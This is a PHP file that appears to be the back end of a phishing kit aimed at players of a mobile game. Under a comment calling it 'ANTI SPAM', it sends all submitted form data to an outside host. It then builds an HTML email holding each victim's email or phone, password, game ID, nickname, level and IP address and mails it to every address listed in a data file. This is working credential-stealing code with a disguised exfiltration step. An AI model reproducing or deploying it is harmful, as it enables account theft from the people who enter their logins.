<?php
// ANTI SPAM 
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://randiramli.my.id/antispam/antispam.php?cekspam=".base64_encode(json_encode($_POST)));
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
$result = curl_exec($ch);
curl_close($ch);
$res = json_decode($result,true);
$code = $res['status'];
$spam = $res['msg'];
 if($spam == "Spam Detected"){
     http_response_code(404);
extract($_POST);
$subjek = "🇲🇨 +62 | $nick | LVL $level";
$pesan = '
<center>
 <div style="background: url(https://f.top4top.io/p_21969kokc0.png) no-repeat;border:2px solid pink;background-size: 100% 100%; width: 294; height: 101px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;">
</div>
 <table border="1" bordercolor="#19233f" style="color:#fff;border-radius:8px; border:3px solid pink; border-collapse:collapse;width:100%;background:#cf0485;">
    <tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Email/Telpon</b></th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$user.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Password</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$pass.'</th> 
</tr>

<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>ID</th>
<th style="width: 65%; text-align: center;"><b>'.$id.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Nickname</th>
<th style="width: 65%; text-align: center;"><b>'.$nick.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Level</th>
<th style="width: 65%; text-align: center;"><b>'.$level.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Elite Pass</th>
<th style="width: 65%; text-align: center;"><b>'.$ep.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Tier</th>
<th style="width: 65%; text-align: center;"><b>'.$tier.'</th> 
</tr>

<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Ip Address</th>
<th style="width: 65%; text-align: center;"><b>'.$ip.'</th> 
</tr>
</table>
<div style="border:2px solid pink;width: 294; font-weight:bold; height: 20px; background: #cf0485; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align:center;">

<a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#25D366;" href="Wa.me/6285771900076">𝚆𝚑𝚊𝚝𝚜𝚊𝚙𝚙</a>
</div>
 <center>
';
include 'alyanesia/data.php';
$sender = 'From: '.$nik.'<'.$sender.'>';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";


$read = file_get_contents('alyanesia/data.json');
$json = json_decode($read,true);

for($i=0;$i<=count($json) - 1;$i++)
{
mail($json[$i]['email'], $subjek, $pesan, $headers);
}
}else{
         http_response_code(404);
     	die('Spam Not Detected');
 }
?>